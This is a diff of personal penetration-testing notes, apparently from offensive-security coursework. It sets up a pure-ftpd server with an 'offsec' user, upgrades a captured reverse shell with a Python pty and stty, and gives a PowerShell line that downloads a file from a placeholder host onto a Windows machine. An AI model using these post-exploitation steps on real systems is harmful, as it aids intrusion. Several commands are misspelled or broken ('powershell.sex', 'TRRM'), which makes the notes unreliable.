@@ -1,9 +1,36 @@
-#!/bin/bash
-sudo groupadd ftpgroup
-sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-sudo pure-pw mkdb
-cd /etc/pure-ftpd/auth
-sudo ln -s ../conf/PureDB 60pdb
-sudo mkdir -p /ftphome
-sudo chown -R ftpuser:ftpgroup /ftpgroup/
-sudo systemctl restart pure-ftpd
+
+
+    pure-ftpd
+        install pure ftpd
+            1.configure setup-ftpd.sh
+                #!/bin/bash
+                sudo groupadd ftpgroup
+                sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+                sudo pure-pw useradd offsec -u ftpuser -d /ftphome
+                sudo pure-pw mkdb
+                cd /etc/pure-ftpd/auth
+                sudo ln -s ../conf/PureDB 60pdb
+                sudo mkdir -p /ftphome
+                sudo chown -R ftpuser:ftpgroup /ftphome/
+                sudo systemctl restart pure-ftpd
+            2.chmod +x 
+            3  ./setup-ftpd.sh
+            4 systemctl restart pure-ftpd.ser
+
+    # when get a inactive shell
+        # to get a better shell
+        python3 -c "import pty; pty.spawn ('/bin/bash')"  
+
+        # to get a interactive shell, after line 21
+            ctrl + z
+                stty raw -echo
+            fg # back to formal command line
+            stty raw -echo
+            export SHELL=/bin/bash
+            export TRRM=screen
+            stty rows 50 columns 120
+            reset 
+    # win7 and later win, powershell download file
+        powershell.sex (New-ObjectSystem.Net.WebClient).DownloadFile('http://IP/xxx','newname.xx')
+ 
+ 
